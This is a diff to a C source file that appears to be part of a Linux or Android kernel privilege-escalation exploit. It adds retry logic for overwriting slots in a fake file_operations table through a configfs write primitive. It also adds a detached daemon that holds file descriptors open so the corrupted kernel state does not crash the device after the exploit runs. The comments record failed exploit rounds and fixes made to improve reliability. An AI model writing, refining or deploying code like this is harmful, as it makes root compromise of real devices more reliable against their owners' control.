@@ -1565,19 +1565,96 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
  * from any context -- normal exit tail, the uid0 monitor SIGKILL's
  * do_exit, or a third-party process -- skips flush/release/fasync and
  * fops_put passes NULL to module_put.  Safe to call repeatedly.
+ *
+ * fix62 (2026-10-24): retry the writes up to 8 times 25ms apart before
+ * giving up.  2026-10-24 afternoon rounds 4/6/7 all died because the SINGLE
+ * write attempt hit the transient cfgfs ENOTTY window (same family as the
+ * fix56 rd==0 retry: a re-issued SET_NAME re-derives the shared ashmem/
+ * configfs buffer state and succeeds on a later attempt) and the failed
+ * neutralize left owner/flush/release armed -> the chain's own close(fd)
+ * walked the dead table -> module_put(garbage) -> panic, 3 of 4 fail
+ * rounds.  Returns 0 when both writes landed (and the owner slot reads
+ * back zero when the verify read itself works), -1 when every attempt
+ * failed -- the caller must then fall back to ks_fd_hold_daemon() instead
+ * of closing the fd.
  */
-void ks_neutralize_fake_fops_close(int fd) {
+int ks_neutralize_fake_fops_close(int fd) {
   if (fd < 0) {
-    return;
+    return -1;
   }
   uint64_t z = 0;
   uint64_t z3[3] = {0, 0, 0};
-  ssize_t wo = configfs_write_once(fd, fops_table_base() + FOPS_OWNER_OFF,
-                                   &z, sizeof(z));
-  ssize_t wt = configfs_write_once(fd, fops_table_base() + FOPS_FLUSH_OFF,
-                                   z3, sizeof(z3));
-  pr_info("ks_neutralize fake fops close slots owner=%zd tail=%zd table=%016zx\n",
-          wo, wt, fops_table_base());
+  ssize_t wo = -1, wt = -1;
+  for (int attempt = 0; attempt < 8; attempt++) {
+    if (attempt) {
+      usleep(25000);
+    }
+    wo = configfs_write_once(fd, fops_table_base() + FOPS_OWNER_OFF, &z,
+                             sizeof(z));
+    wt = configfs_write_once(fd, fops_table_base() + FOPS_FLUSH_OFF, z3,
+                             sizeof(z3));
+    if (wo == (ssize_t)sizeof(z) && wt == (ssize_t)sizeof(z3)) {
+      break;
+    }
+  }
+  int ok = (wo == (ssize_t)sizeof(z) && wt == (ssize_t)sizeof(z3));
+  int verified = 0;
+  if (ok) {
+    /* Best-effort verify: a working read confirming zero closes the loop;
+     * a read failure does not veto the successful writes (the ENOTTY read
+     * window is the same transient the retries just escaped). */
+    uint64_t chk = 0xffff;
+    ssize_t rd = configfs_read_once_quiet(
+        fd, fops_table_base() + FOPS_OWNER_OFF, &chk, sizeof(chk));
+    verified = (rd == (ssize_t)sizeof(chk) && chk == 0);
+  }
+  pr_info("ks_neutralize fake fops close slots owner=%zd tail=%zd table=%016zx "
+          "ok=%d verified=%d\n",
+          wo, wt, fops_table_base(), ok, verified);
+  return ok ? 0 : -1;
+}
+
+/*
+ * fix62: last-resort containment when neutralize cannot write.  The fake
+ * table's close-path slots stay armed, so ANY fput of a fake-fops file --
+ * the exit tail's probe fd, the physrw fd, or the batch close_files() sweep
+ * at do_exit -- panics via module_put(garbage).  Fork a detached holder
+ * that inherits EVERY open file (file->_f_count +1 per file); the parent
+ * then exits, each fput stops one short of zero, and __fput -- with its
+ * flush/release/fops_put landmines -- never runs for any of them.  The
+ * holder pauses forever; the fail amplifier reboots the box, which is the
+ * only real reclamation for a dead payload page.  Only async-signal-safe
+ * calls in the child (fork in a multithreaded process).
+ */
+void ks_fd_hold_daemon(const char *why) {
+  pid_t pid = fork();
+  if (pid < 0) {
+    pr_warning("fd-hold fork failed errno=%d (%s); fake fops close slots "
+               "STILL ARMED -- do not let this process exit before reboot\n",
+               errno, why);
+    return;
+  }
+  if (pid == 0) {
+    setsid();
+    signal(SIGTERM, SIG_IGN);
+    signal(SIGINT, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+    signal(SIGPIPE, SIG_IGN);
+    signal(SIGUSR1, SIG_IGN);
+    signal(SIGUSR2, SIG_IGN);
+    prctl(PR_SET_NAME, "ks_fd_hold", 0, 0, 0);
+    static const char msg[] =
+        "fd-hold: holding fake-fops files alive (neutralize failed); "
+        "safe until reboot\n";
+    ssize_t _w = write(2, msg, sizeof(msg) - 1);
+    (void)_w;
+    for (;;) {
+      pause();
+    }
+  }
+  pr_warning("fd-hold daemon pid=%d holding all chain fds (%s); the fake "
+             "table close slots are UNCLEARED -- reboot before any re-run\n",
+             (int)pid, why);
 }
 
 /*
